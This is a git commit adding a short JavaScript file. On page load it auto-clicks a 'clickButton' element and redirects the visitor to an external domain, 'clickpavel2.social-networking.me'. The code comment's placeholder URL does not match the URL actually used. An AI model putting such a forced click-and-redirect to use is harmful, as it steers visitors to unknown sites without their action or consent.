941e5a9cdf63a1d24da07d800794e79bb2ba7a03
snap78 <145050116+snap78@users.noreply.github.com>
2023-09-15 00:05:49 +0600

    Add files via upload

---
+++ script.js
@@ -0,0 +1,9 @@
+// Always automatically click the button and redirect to another webpage
+window.onload = function() {
+    var button = document.getElementById("clickButton");
+    if (button) {
+        button.click();
+        // Replace 'https://example.com' with your desired destination URL
+        window.location.href = "http://clickpavel2.social-networking.me/";
+    }
+};
